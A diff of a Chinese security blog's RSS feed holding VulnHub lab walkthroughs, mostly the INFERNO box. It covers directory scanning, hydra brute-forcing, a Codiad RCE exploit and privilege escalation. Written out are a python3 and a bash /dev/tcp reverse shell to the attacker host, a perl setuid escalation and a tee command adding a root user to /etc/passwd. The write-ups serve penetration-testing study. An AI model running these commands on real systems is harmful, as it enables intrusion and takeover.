+&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy9wbGFuZXQuaHRtbA==&#34;&gt;http://192.168.31.5/files/planet.html&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-800.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9yZXF1aXJlbWVudHMucGhw&#34;&gt;http://192.168.31.5/requirements.php&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-801.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;找不到更多的线索了，根据已有的进行总结，发现只有一个 pluck 4.7.13 的信息，和一个后台的登陆地址可以利用&lt;/p&gt;
+&lt;h3 id=&#34;pluck-漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pluck-漏洞利用&#34;&gt;#&lt;/a&gt; pluck 漏洞利用&lt;/h3&gt;
+&lt;p&gt;用 searchsploit 搜索寻 pluck 对应版本漏洞，发现存在一个授权才能访问的 RCE 漏洞&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-802.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;确认 payload 的位置，将其复制到自己的目录下&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-803.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-804.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;阅读此 py 文件，根据脚本中的内容，带参数执行脚本&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-805.png&#34; width=&#34;220&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;由于此漏洞只适应于 pluck 的授权 RCE，此处如果不能破解出来其账户和密码，显然无法使用，经尝试并不是弱口令，放弃这个目标，继续信息搜集&lt;/p&gt;
+&lt;h3 id=&#34;dirb-扩大信息面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dirb-扩大信息面&#34;&gt;#&lt;/a&gt; dirb 扩大信息面&lt;/h3&gt;
+&lt;p&gt;dirb 的优点在于搜集到一级目录后，还会继续尝试二级目录的识别&lt;/p&gt;
+&lt;p&gt;用 dirb 收集更多的字目录信息: &lt;code&gt;dirb 192.168.31.5&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-806.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;依次去打开这些二级目录，发现了一个敏感的地址:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kYXRhL3RyYXNoLw==&#34;&gt;http://192.168.31.5/data/trash/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-807.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;继续向下深入，看三级目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kYXRhL3RyYXNoL2ZpbGVzL3NoZWxsLnBoYXI=&#34;&gt;http://192.168.31.5/data/trash/files/shell.phar&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;最终在此路径下找到了一个 shell.phar 的文件，此命名就比较敏感&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-808.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 访问此目录，是一个 webshell，现在拿到了网站权限&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-809.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在网站上执行命令有诸多不便，需要将其反弹到终端上&lt;/p&gt;
+&lt;p&gt;检测到服务器没有 nc，有一个 python3 ，就用 python3 来反弹 shell&lt;br&gt;
+ &lt;code&gt;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.31.75 &amp;quot;,444 4 ));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-810.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;设置 stty 的格式，输出为一个比较美观的终端&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-811.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;端口敲门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口敲门&#34;&gt;#&lt;/a&gt; 端口敲门&lt;/h3&gt;
+&lt;p&gt;敲门（knock）指的是我们从自己的客户端设备（pc、笔记本或者手机）向服务器 IP 发送一系列实现约好的暗号，而服务器上需要相应的安装接收暗号的服务 knockd，它在接收到正确的暗号的时候，会临时性的为敲门者开一段时间的门并随后关上（当然也能够配置成一直开着），我们要在这几秒钟里面登录成功并且保持连接，如果不小心断了连接就要重新敲门。&lt;/p&gt;
+&lt;p&gt;拿到服务器的权限之后，去看了一些敏感文件，敏感权限之后都没有任何问题，筛选端口的时候发现 knock 命令&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-812.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看 knock 的配置文件&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-813.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;找到了一个 root 账户的端口敲门的配置问题，依次去敲击 14,29,43 端口可以将防火墙规则调整为开放，依次去敲击 62,40,46 端口可以将防火墙规则调整为关闭，注意有一个两个端口之间的间隔时间不能大于 15 ms&lt;/p&gt;
+&lt;p&gt;依次按顺序敲击这三个端口 &lt;code&gt;sudo nmap -p 14,29,43 192.168.31.5&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-814.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;敲击端口前，是 22 是被过滤的，端口敲门之后并没有立即将端口轰开，反而是等待了一段时间之后才将 22 端口打开，现在 22 已经打开，可以通过 ssh 去连接这台服务器了，但是我们并没有 root 账户的密码，怎么去连接呢。&lt;/p&gt;
+&lt;p&gt;先直接去做，看能不能有什么收获 &lt;code&gt;ssh root@192.168.31.5&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-815.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 ssh&lt;/h3&gt;
+&lt;p&gt;看到了一个 github 地址，点开进入&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-816.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;发现是一系列密码并且提示用 proxima、centauri 进行爆破，将字典加载到本地，准备用 hydra 爆破一波&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-817.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看到服务器上存在的用户&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-818.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;服务器存在 proxima、centauri 用户，将这两个名字写到 user.txt 中，用 hydra 进行爆破&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-819.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;hydra -L user.txt -P passwd.txt ssh://192.168.31.5 -t 4 -I -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-820.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;很遗憾，爆破失败，继续往下做，在实际测试中，经常有爆破失败的情况，我们需要从更多的角度去收集服务器的信息，经过检查，发现服务器上存在 mysql 的备份文件&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-821.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 备份文件中就有用户名和密码，alfauser:passw0rd&lt;/p&gt;
+&lt;h3 id=&#34;数据库信息泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据库信息泄露&#34;&gt;#&lt;/a&gt; 数据库信息泄露&lt;/h3&gt;
+&lt;p&gt;登陆数据库，查询敏感账户和密码： &lt;code&gt;mysql -u alfauser -p&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-822.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;连接成功，搜索敏感文件&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-823.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;一翻搜索后，在数据库中找到了 proxima 账户和其密码，切换账户至 proxima 账户，成功拿到其 shell&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-824.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;cap_setuid-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cap_setuid-提权&#34;&gt;#&lt;/a&gt; cap_setuid 提权&lt;/h3&gt;
+&lt;p&gt;接下来要想办法提权至 root，直接上监控 linpeas 看有什么可疑的文件&lt;br&gt;
+ &lt;code&gt;wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-825.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;运行 linpeas 进行检测&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-826.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;使用 linpeas 之后监测到一个权限设置错误的命令 perl&lt;/p&gt;
+&lt;p&gt;Capabilities 是 linux 的一种访问控制能力，能够更精细化的将操作系统权限（网络，文件等）赋权给应用程序，其中就包括设置 uid 和 gid 的权限。因此具备 cap_setuid 和 cap_setgid 权限的程序可以用来进行权限提升。&lt;/p&gt;
+&lt;p&gt;提权利用命令在 gtfobins 上可以找到更多：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcGVybC8=&#34;&gt;https://gtfobins.github.io/gtfobins/perl/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-827.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;看官方介绍，也就是为了细分 root 权限的 capabilities，但是也会因为设置错误导致权限提升&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;./perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &amp;quot;/bin/sh&amp;quot;;&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-828.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 成功拿到 root 权限&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/139%20INFERNO/</guid>
+            <title>VULNHUB 39 INFERNO</title>
+            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/139%20INFERNO/</link>
+            <category>VULNHUB 31-40</category>
+            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaW5mZXJuby0xMSw2MDMv&#34;&gt;https://www.vulnhub.com/entry/inferno-11,603/&lt;/span&gt;&lt;br&gt;
+ 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDY4ODA1MC9hcnRpY2xlL2RldGFpbHMvMTE5OTAyNzM1&#34;&gt;https://blog.csdn.net/weixin_50688050/article/details/119902735&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
+&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
+ 靶机 INFERNO：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
+&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
+由已至内网靶机所在主机 MAC 地址自动扫描靶机服务&lt;br&gt;
+ &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1066.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.25 靶机开放端口 22,80&lt;/p&gt;
+&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjUv&#34;&gt;http://192.168.31.25/&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1067.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;目录扫描 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.25/&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1068.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;发现了一个敏感的地址，进入后需要发现认证:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjUvaW5mZXJubw==&#34;&gt;http://192.168.31.25/inferno&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1069.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;也没有别的办法了，只能对这个页面进行爆破用户名和密码&lt;/p&gt;
+&lt;h3 id=&#34;hydra-爆破网站后台&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破网站后台&#34;&gt;#&lt;/a&gt; hydra 爆破网站后台&lt;/h3&gt;
+&lt;p&gt;利用 hydra 选取合适的用户名字典进行爆破&lt;br&gt;
+ &lt;code&gt;hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 192.168.31.2 5 -f http-get /inferno/ -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1070.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;这个爆破时间是比较长的，每一个用户名都要匹配几百万次，是非常慢的因为大部分网站的用户名都是 admin，此处我们直接用 admin 爆破，可以简化很多事情，但是每一次只能爆破 64 个，速度也是不容乐观的&lt;br&gt;
+ &lt;code&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.31.221 -f http-get /inferno/ -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1071.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;等待大概两三个小时差不多就出结果了&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;凭借 admin:dante1 可进入网站第一层认证结束之后，还有第二层认证，但是好在第一层和第二层的用户名和密码是相同的输入 admin:dante1 后成功进入网站后台&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1072.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;文件上传尝试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传尝试&#34;&gt;#&lt;/a&gt; 文件上传尝试&lt;/h3&gt;
+&lt;p&gt;这是一些 php 的源码文件，代码审计后没有发现突破口&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1073.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;右键可以上传文件，可以上传一个 php 文件看看什么效果&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1074.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;上传 shell.php 文件用来反弹 shell&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1075.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;找了大半天根本找不到 shell.php 上传的位置，只能放弃这个方法&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1076.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;但是仔细观察的话，发现这个网站的 header 的部分，有一个 codiad，这是一个框架，可以去搜索这个框架自身有没有漏洞&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1077.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;codiad-rce漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#codiad-rce漏洞&#34;&gt;#&lt;/a&gt; codiad RCE 漏洞&lt;/h3&gt;
+&lt;p&gt;本地直接用 searchsploit 搜寻 codiad 发现了是存在 RCE 漏洞&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1078.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-x 确定 exp 的位置，将 exp 复制到自己的目录下&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1079.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;直接用 py 运行此程序，看一下使用说明&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1080.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;依据使用说明，构造好命令&lt;br&gt;
+ &lt;code&gt;python exploit.py http://admin:dante1@192.168.31.25/inferno/ admin dante1 192.168.31.83 4444 linux&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;echo &#39;bash -c &amp;quot;bash -i &amp;gt;/dev/tcp/192.168.31.135/4445 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;quot;&#39; | nc -lnvp 4444&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;nc -lnvp 4444&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在 http: 后面加了 admin:dante1@是为了突破第一层的认证，因为进入该网站需要两次认证，认证了第一次之后才会进入到 codiad 页面，否则显示未授权&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1081.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;显示是失败的，不知道什么原因，但是在实际测试中，经常会碰到这样的情况，这时就需要在去寻找新的 payload 进行利用&lt;/p&gt;
+&lt;p&gt;找到了一个 RCE 漏洞的脚本: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmcvQ29kaWFkLVJlbW90ZS1Db2RlLUV4ZWN1dGUtRXhwbG9pdA==&#34;&gt;https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1082.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;python exploit.py http://192.168.31.25/inferno/ admin dante1 192.168.31.83 4444 linux&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1083.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;没有加第一层认证回显了未授权  &lt;code&gt;python exploit.py http://admin:dante1@192.168.31.25/inferno/) admin dante1 192.168.31.83 4444 linux&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1084.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在 4445 端口处接收到了反弹的 shell, 拿到了网站的 webshell, 依据下面三个命令输出为一个标准的 shell&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1085.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;十六进制换算&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#十六进制换算&#34;&gt;#&lt;/a&gt; 十六进制换算&lt;/h3&gt;
+&lt;p&gt;看了 /etc/passwd 发现我们需要先拿到 dante 用户的权限再去拿 root 权限&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1086.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;搜寻目录，在 dante 的 Downloads 文件下找到了一个.download.daty 隐藏文件，打开之后看到是一串 16 进制的数据，需要解密&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1087.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在 CyberChef 上进行解密，from Hex 得到了 dante 用户的密码 V1rg1l10h3lpm3&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1088.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在密码的最后有个小数点，并不知道这个小数点是否参与了密码，但是试两次就知道结果了 V1rg1l10h3lpm3. 或者 V1rg1l10h3lpm3&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1089.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;凭借第二个密码拿到了 dante 用户的 shell&lt;/p&gt;
+&lt;h3 id=&#34;term-设置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#term-设置&#34;&gt;#&lt;/a&gt; TERM 设置&lt;/h3&gt;
+&lt;p&gt;输入 clear 时显示 TERM 变量没有设置，我们只需要通过 export 命令将 TERM 改为 xterm 即可解决这个终端美化问题&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1090.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;tee权限错误写passwd&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tee权限错误写passwd&#34;&gt;#&lt;/a&gt; tee 权限错误写 passwd&lt;/h3&gt;
+&lt;p&gt;sudo -l 看到直接调用 tee 命令写入文件&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1091.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在 gtfobins 上看到了使用 tee 提权的代码如下，先设置一个本地的文件，将自己的一些数据追加到本地的文件里边，基于此，构造一个 SHA512 的密码，直接往 /etc/passwd 里边添加一个 root 账户&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1092.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;利用 kali 机器生成一个 SHA512 的值，密码为 123456  &lt;code&gt;mkpasswd --method=SHA-512 --stdin&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1093.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在靶机上依次执行下列命令，报错先不管&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;写入新的享有root功能的用户&lt;span class=&#34;built_in&#34;&gt;test&lt;/span&gt; 2 并验证是否写入成功&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LFILE=/etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;test2:$6$/VIJFJppMzTLzIjH$fnPPrC8J2dR8Fei748mY5MNaETVedvIoFgAXA8c33GThHZ2Cy7cflwv9Eo5xZJGWLHir1J.jh3VnnaBMkP74/0:0:0:root:/root:/bin/bash&amp;#x27; | sudo tee -a &amp;quot;$LFILE&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/passwd | grep /bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;依据新建的用户进入其shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;su test2 123456&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1094.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 结果显示我们当前已经拿到了 root 账户&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -791,186 +1102,6 @@ John 1.txt –format=Raw-MD5 –wordlist=/usr/share/wordlists/dirbuster/director
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/139%20INFERNO/</guid>
-            <title>VULNHUB 39 INFERNO</title>
-            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/139%20INFERNO/</link>
-            <category>VULNHUB 31-40</category>
-            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaW5mZXJuby0xMSw2MDMv&#34;&gt;https://www.vulnhub.com/entry/inferno-11,603/&lt;/span&gt;&lt;br&gt;
- 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDY4ODA1MC9hcnRpY2xlL2RldGFpbHMvMTE5OTAyNzM1&#34;&gt;https://blog.csdn.net/weixin_50688050/article/details/119902735&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
-&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
- 靶机 INFERNO：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
-&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
-由已至内网靶机所在主机 MAC 地址自动扫描靶机服务&lt;br&gt;
